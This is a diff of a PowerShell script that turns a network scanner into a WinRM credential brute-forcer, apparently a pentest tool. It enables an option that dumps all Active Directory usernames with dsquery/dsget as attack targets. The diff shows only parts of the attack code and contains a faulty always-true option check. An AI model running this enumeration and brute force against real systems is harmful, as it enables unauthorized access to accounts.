@@ -1,9 +1,9 @@
-﻿   <#
+   <#
 	.SYNOPSIS
-		Scan Network Devices
+		Brute force credentials using WinRM
 
 	.DESCRIPTION
-		Simple Light Weight Network Scanner
+		Brute force credentials using WinRM
 
 	.NOTES
 		Aurthor: https://securethelogs.com
@@ -44,10 +44,8 @@ $logo
 
     Write-Output ""
     Write-Output "Please Select One Of The Following Options"
-    Write-Output "Option 1: Single User | Option 2: Txt File Location"
-
-    #Option 3 to come...
-    #Write-Output "Option 1: Single User | Option 2: Txt File Location | Option 3: Attempt To Extract From AD"
+    
+    Write-Output "Option 1: Single User | Option 2: Txt File Location | Option 3: Attempt To Extract From AD"
     
         
     [string]$useroption = Read-Host -Prompt "Option Number"
@@ -78,15 +76,14 @@ $logo
 
     # --------- user wants to try recon ------------------------
 
-    <#
+    
 
     if ($useroption -eq "3"){
 
     $outputloc = "C:\Temp\users.txt"
 
-    # ********* get the command rights. Pull usernames
-
-    dsquery user -name * | dsget user -email >> $outputloc
+    
+    dsquery user -name * | dsget user -samid >> $outputloc
     
     $pullusers = Get-Content -Path $outputloc
 
@@ -99,7 +96,7 @@ $logo
 
     } 
 
-    #>
+    
 
     if ($useroption -ne "1" -OR $useroption -ne "2" -OR $useroption -ne "3" ){
     
@@ -194,8 +191,5 @@ Write-Output "Brute Force Failed...."
 
 }
 
-
-
-#------------------------------------------------------------------Break ----------------------------
 
 
